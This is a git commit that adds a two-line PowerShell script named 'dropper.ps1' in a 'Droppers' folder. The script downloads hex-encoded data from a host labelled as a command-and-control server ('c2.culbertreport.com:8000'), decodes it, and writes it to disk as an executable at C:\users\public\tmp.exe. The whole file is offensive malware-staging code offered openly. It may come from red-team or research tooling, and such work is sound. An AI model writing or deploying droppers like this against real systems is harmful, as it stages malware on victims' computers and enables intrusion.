4aa197618760fef7ffe9ef358cdc4238e912560b
matt-culbert <culbertmatt@gmail.com>
2022-05-27 12:59:36 -0400

    Create dropper.ps1

---
+++ Droppers/dropper.ps1
@@ -0,0 +1,2 @@
+invoke-restmethod 'http://c2.culbertreport.com:8000' | Tee-Object -Variable hex
+[System.IO.File]::WriteAllBytes('C:\users\public\tmp.exe', ($hex -split '(.{2})' -ne '' -replace '^', '0X')) 
